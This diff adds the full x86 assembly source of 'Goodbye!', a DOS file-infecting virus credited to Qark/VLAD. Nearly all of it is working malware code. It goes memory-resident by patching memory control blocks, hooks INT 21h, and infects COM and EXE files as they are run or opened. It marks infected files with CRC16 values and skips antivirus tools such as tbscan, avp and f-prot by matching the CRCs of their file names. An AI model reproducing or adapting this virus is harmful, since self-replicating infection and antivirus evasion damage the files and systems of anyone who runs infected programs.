@@ -1,0 +1,497 @@
+
+;       Goodbye!
+;       by Qark/VLAD
+;
+; This virus is to say goodbye to all my friends in the virus scene.
+;
+;
+; Infects EXE's and COM's, using CRC32 on any data comparisons.
+;
+; Ideas stolen from Zhengxi - but not the code!
+;
+; Compile with a86 as ever.
+;
+
+        org     0
+
+        ;Below is stupid stuff
+        sub     ax,ax
+        mov     cx,ax
+        dec     ax
+        sub     ch,al
+        mov     dx,cx
+        rol     cx,1
+        mov     dl,al
+        div     cx
+        div     cx
+        div     cx
+        div     cx
+        div     cx
+        dec     cx
+        add     dx,ax
+        div     cx
+        div     cx
+        div     cx
+        xchg    dx,ax
+
+        mov     si,100h
+        org     $-2
+delta   dw      100h
+
+        mov     ax,51bdh
+        int     21h
+        cmp     ax,0bd51h
+        je      notvirus
+
+        mov     ax,ds
+        add     ax,dx
+        mov     ds,ax
+        xor     di,di
+
+        cmp     byte ptr [di],'Z'
+        jne     notvirus
+
+        sub     word ptr [di+3],(offset vmemsize /16)+2
+        sub     word ptr [di+12h],(offset vmemsize/16)+2
+        
+        ;Because so many people complained i've fixed my MCB code :)
+        ;UMB's now survive..
+        mov     byte ptr [di],'M'
+        add     ax,word ptr [di+3]
+        inc     ax
+        mov     ds,ax
+        mov     byte ptr ds:[di],'Z'
+        mov     word ptr ds:[di+1],8
+        mov     word ptr ds:[di+3],(offset vmemsize/16)+1
+        inc     ax
+
+        push    es
+        pop     ds
+        mov     es,ax           ;ax=es=virus segment
+        
+        cld
+        push    si
+        mov     cx,offset vpsize
+        db      2eh             ;cs:
+        rep     movsb
+        
+        push    ds
+        mov     ds,cx           ;ds=0
+        mov     es,ax
+        mov     si,21h*4
+        mov     di,offset i21
+        movsw
+        movsw
+        mov     word ptr [si-4],offset virushandler
+        mov     word ptr [si-2],ax
+
+        pop     ds
+        push    ds
+        pop     es
+        pop     si
+notvirus:
+        push    cs
+        pop     ds
+
+        cmp     si,16
+        jb      exefile
+
+        mov     di,101h
+        mov     ax,word ptr [si+orig5]
+        mov     word ptr [di-1],ax
+        mov     ax,word ptr [si+orig5+2]
+        mov     word ptr [di+1],ax
+        mov     al,byte ptr [si+orig5+4]
+        mov     byte ptr [di+3],al
+
+        dec     di
+        xor     ax,ax
+        jmp     di
+
+        db      "Goodbye everyone!",0dh,0ah
+        db      "Viruses were fun, but I've got other things I'd like to do",0dh,0ah
+        db      "Qark/VLAD",0dh,0ah
+
+exefile:
+        mov     ax,es
+        add     ax,10h
+        add     word ptr cs:[si+offset exejump+2],ax
+        jmp     $+2
+        push    es
+        pop     ds
+        add     ax,0
+        org     $-2
+origss  dw      0
+        mov     ss,ax
+        mov     sp,0
+        org     $-2
+origsp  dw      0
+        xor     ax,ax
+        xor     bx,bx
+        xor     cx,cx
+        xor     dx,dx
+        xor     si,si
+        xor     di,si
+
+        db      0eah
+exejump dd      0
+
+virushandler:
+        xchg    ah,al
+        cmp     ax,0bd51h
+        jne     notres
+        iret
+notres:
+        cmp     al,4bh
+        je      infect
+        cmp     al,3dh
+        je      infect
+        cmp     al,43h
+        je      infect
+out21:
+        xchg    ah,al
+        db      0eah
+i21     dd      0
+
+infect:
+        pushf
+        push    ax
+        push    bx
+        push    cx
+        push    dx
+        push    si
+        push    di
+        push    ds
+        push    es
+
+        cld
+        cmp     ah,6ch
+        je      no6cchange
+        mov     si,dx
+no6cchange:
+        push    cs
+        pop     es
+        mov     di,offset filename
+        mov     ah,60h
+        call    int21h
+        jnc     goodname
+badname1:
+        jmp     badname
+goodname:
+        push    cs
+        pop     ds
+
+        call    check_name
+        jc      badname1
+
+        mov     dx,offset filename
+        mov     ax,3d02h
+        call    int21h
+        jc      badname1
+        xchg    bx,ax
+
+        mov     ah,3fh
+        mov     cx,18h
+        mov     dx,offset header
+        call    int21h
+
+        mov     si,offset header
+        mov     cx,2
+        call    crc16
+        
+        cmp     ax,6bb5h                ;MZ
+        je      infexe
+        cmp     ax,95fah                ;ZM
+        je      infexe
+infcom:
+        mov     si,offset header
+        mov     cx,5
+        call    crc16
+        or      ax,ax
+        jz      badclose                 ;Infected!
+
+        call    lseekend
+
+        or      dx,dx
+        jnz     badclose
+        cmp     ax,64000
+        ja      badclose
+        cmp     ax,1001
+        jb      badclose
+
+        push    ax
+        sub     ax,3
+        mov     word ptr combyte+1,ax
+        pop     ax
+        add     ax,100h
+        mov     word ptr delta,ax
+
+        mov     ah,40h
+        mov     cx,offset vpsize
+        xor     dx,dx
+        call    int21h
+        jc      badclose
+        
+        call    lseek0
+
+        ;to mark infection, crc check the e9,xx,xx and put the crc
+        ;after it, before writing to file.
+
+        mov     si,offset combyte
+        mov     cx,3
+        call    crc16
+
+        mov     word ptr combyte+3,ax
+
+        mov     ah,40h
+        mov     cx,5
+        mov     dx,offset combyte
+        call    int21h
+        
+badclose:
+        mov     ah,3eh
+        call    int21h
+        jmp     badname
+infexe:
+        mov     si,offset header
+        mov     cx,14h
+        call    crc16
+        or      ax,ax
+        jz      badclose                 ;already infected
+        
+        cmp     word ptr [si+18h],40h
+        je      badclose
+        cmp     word ptr [si+0ch],-1
+        jne     badclose
+
+        mov     ax,word ptr [si+0eh]
+        mov     word ptr origss,ax
+        mov     ax,word ptr [si+10h]
+        mov     word ptr origsp,ax
+
+        mov     ax,word ptr [si+14h]
+        mov     word ptr exejump,ax
+        mov     ax,word ptr [si+16h]
+        mov     word ptr exejump+2,ax
+
+        call    lseekend
+        mov     cx,16
+        div     cx
+        sub     ax,word ptr [si+8]
+        mov     word ptr [si+14h],dx
+        mov     word ptr [si+16h],ax
+        mov     word ptr delta,dx
+        add     dx,offset vmemsize
+        and     dx,0fffeh
+        inc     ax
+
+        mov     word ptr [si+0eh],ax
+        mov     word ptr [si+10h],dx
+
+        mov     ah,40h
+        mov     cx,offset vpsize
+        xor     dx,dx
+        call    int21h
+        jc      badclose
+
+        call    lseekend
+
+        mov     cx,512
+        div     cx
+        or      dx,dx
+        jz      nopagefix
+        inc     ax
+nopagefix:
+        mov     word ptr [si+4],ax
+        mov     word ptr [si+2],dx
+
+        mov     cx,12h
+        call    crc16
+        mov     word ptr [si+12h],ax
+
+        call    lseek0
+
+        mov     ah,40h
+        mov     cx,1ch
+        mov     dx,si
+        call    int21h
+        jmp     badclose
+
+badname:
+        pop     es
+        pop     ds
+        pop     di
+        pop     si
+        pop     dx
+        pop     cx
+        pop     bx
+        pop     ax
+        popf
+        jmp     out21
+
+
+;;;;---------->
+lseekend:
+        mov     ax,4202h
+        jmp     lseek
+lseek0:
+        mov     ax,4200h
+lseek:
+        xor     cx,cx
+        cwd
+        call    int21h
+        ret
+;;;;---------->
+check_name:
+        mov     si,offset filename
+        cmp     byte ptr [si+2],'/'     ;"CON" etc gives a reverse slash.
+        je      fail_name               ;Will mess up my backslash checking
+                                        ;if a program tries to open one.
+findstrend:
+        lodsb
+        cmp     al,0
+        jne     findstrend
+        dec     si
+        mov     word ptr zpointer,si
+        std
+findslend:
+        lodsb
+        cmp     al,'\'
+        jne     findslend
+        cld
+        lodsw
+        mov     word ptr fpointer,si
+        ;si points to file name name.ext hopefully
+
+        mov     cx,word ptr zpointer
+        sub     cx,si
+
+        call    crc16
+        ;ax = crc value
+        cmp     ax,0bd8h                ;tbscan.exe
+        je      fail_name
+        cmp     ax,0f07fh               ;avp.exe
+        je      fail_name
+        cmp     ax,5e88h                ;f-prot.exe
+        je      fail_name
+        cmp     ax,3cb2h                ;scan.exe
+        je      fail_name
+        cmp     ax,86a5h                ;dv.exe
+        je      fail_name
+        cmp     ax,0ba8eh               ;progman.exe
+        je      fail_name
+
+        mov     si,word ptr zpointer
+        cmp     byte ptr [si-4],'.'
+        jne     fail_name
+
+        sub     si,3
+        mov     cx,3
+        call    crc16
+
+        cmp     ax,0e6ebh               ;exe
+        je      pass_name
+        cmp     ax,0d105h               ;com
+        je      pass_name
+        jmp     fail_name
+
+pass_name:
+        clc
+        ret
+fail_name:
+        stc
+        ret
+;;;;---------->
+crc16   proc    near
+;on entry cx=number of bytes to checksum
+;         si=pointer to bytes
+;on exit ax contains the checksum
+;I stole this code from some PD sources I got off a BBS.
+
+        push    bx
+        push    cx
+        push    si
+        push    di
+
+        call    gentable
+
+        xor     ax,ax
+crc16loop:
+        xor     bh,bh
+        mov     bl,al
+        lodsb
+        xor     bl,al
+        shl     bx,1
+        mov     bx,word ptr [bx+crc16tab]
+        xor     bl,ah
+        mov     ax,bx
+        loop    crc16loop
+
+        pop     di
+        pop     si
+        pop     cx
+        pop     bx
+
+        ret
+
+crc16   endp
+;;;;---------->
+Gentable        proc    near
+;Generates the 16bit crc table.
+
+        push    ax
+        push    cx
+        push    dx
+        push    di
+
+        mov     di,offset crc16tab
+        xor     cx,cx
+outgen:
+        xor     ax,ax
+        mov     al,cl
+        push    cx
+        mov     cx,8
+calcloop:
+        clc
+        rcr     ax,1
+        jnc     nocrcxor
+        xor     ax,0a001h
+nocrcxor:
+        loop    calcloop
+        mov     word ptr [di],ax
+        inc     di
+        inc     di
+        pop     cx
+        inc     cx
+        cmp     cx,100h
+        jne     outgen
+
+        pop     di
+        pop     dx
+        pop     cx
+        pop     ax
+        ret
+Gentable        endp
+;;;;---------->
+int21h:
+        pushf
+        call    dword ptr cs:i21
+        ret
+;;;;---------->
+
+combyte         db      0e9h,0,0,0,0
+header:
+orig5           db      0cdh,20h,0,0,0
+vpsize:
+                db      18h - 5 dup (0)
+
+zpointer        dw      0       ;the offset of the end of the filename
+fpointer        dw      0       ;the offset of the start of the filename
+
+filename        db      128 dup (0)
+
+crc16tab        db      100h*2 dup (0)
+
+vmemsize:
+
+
